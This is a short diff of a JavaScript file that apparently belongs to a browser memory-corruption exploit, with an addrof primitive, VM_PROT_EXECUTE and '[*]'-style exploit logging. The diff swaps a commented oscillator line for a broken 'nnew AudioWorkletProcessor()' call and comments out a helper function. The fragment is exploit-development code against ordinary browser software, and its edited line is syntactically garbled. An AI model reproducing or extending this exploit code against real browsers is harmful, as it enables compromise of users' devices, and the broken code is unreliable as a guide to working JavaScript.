@@ -631,7 +631,7 @@ var VM_PROT_EXECUTE = 0x4
         //never tried this method...
         //const audioCtx = new AudioContext();
 
-        //var oscillator = new OscillatorNode(audioCtx);
+        var oscillator = nnew AudioWorkletProcessor();
         log('[*] Creating the HTMLDivElement wrapper...');
         //var d = oscillator;
         let ad_div = addrof(d);
@@ -682,8 +682,8 @@ var VM_PROT_EXECUTE = 0x4
               return {fill: 1, b: b0};
                 
             }
-            var div = (e) => {
+            /*var div = (e) => {
               var d = e;
               
-          }
+          }*/
           });
